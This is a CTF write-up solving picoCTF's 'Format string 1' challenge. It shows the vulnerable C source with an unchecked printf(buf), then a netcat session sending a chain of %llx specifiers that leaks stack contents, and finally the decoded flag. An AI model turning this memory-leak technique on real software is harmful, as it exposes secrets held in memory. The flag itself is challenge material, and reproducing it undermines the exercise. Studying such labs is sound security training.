# Format string 1

In this challenge we are given a binary file from which we to check whether its is a 32 bit or 62 bit.
Whether it is 32 bit or 64 bit will matter because it will decide the format specifier we need to use. Wheter it will be int, long int or long long int

From the image given below we can see that the binary file is of 64 bit.

![Screenshot (754)](https://github.com/user-attachments/assets/a8201765-79e6-4fc9-a13a-530b0939cfed)

The source code for the challenge is geven :-
```bash
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
We can see that initially it reads menu items from two files namely `secret-menu-item-1.txt` and `secret-menu-item-2.txt`.
in `printf(buf);` there is a format string vulnerability a format specifier is missing.

Initially i tried entering `%x` in succession just like in the format string 0 challenge.
it gave the output in hexadecimal form. After that I used hexadecimal to ASCII converter, but it was missing some parts of the flag.

![Screenshot (744)](https://github.com/user-attachments/assets/8f1d8aa7-3004-43dd-99b4-ada728fe8f53)

Then I used `%llx` as input:-
![Screenshot (750)](https://github.com/user-attachments/assets/00a2ddd7-16b5-49fb-a27f-dc625257237a)

As we can see we got the output correctly.
```bash
muizz@LAPTOP-VF1FT9IQ:~$ nc mimas.picoctf.net 51271
Give me your order and I'll read it back to you:
%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:%llx:
Here's your order: 402118:0:761c1bba1a00:0:1245880:a347834:7ffcbab79680:761c1b992e60:761c1bbb74d0:1:7ffcbab79750:0:0:7b4654436f636970:355f31346d316e34:3478345f33317937:65355f673431665f:7d346263623736:7:761c1bbb98d8:2300000007:206e693374307250:a336c797453:9:761c1bbcade9:761c1b99b098:761c1bbb74d0:0:7ffcbab79760:6c6c253a786c6c25:253a786c6c253a78:786c6c253a786c6c:6c253a786c6c253a:3a786c6c253a786c:6c6c253a786c6c25:253a786c6c253a78:786c6c253a786c6c:6c253a786c6c253a:3a786c6c253a786c:6c6c253a786c6c25:253a786c6c253a78:786c6c253a786c6c:6c253a786c6c253a:3a786c6c253a786c:6c6c253a786c6c25:253a786c6c253a78:786c6c253a786c6c:6c253a786c6c253a:
Bye!
```

Now if we convert the hexadecimal to ASCII we get the flag in a jumbled order.
After rearranging it we get the final flag.

![Screenshot (749)](https://github.com/user-attachments/assets/17034be5-fb93-4bbf-82bb-56f53ac597c1)


flag:- picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}

This is how I solvedd it.

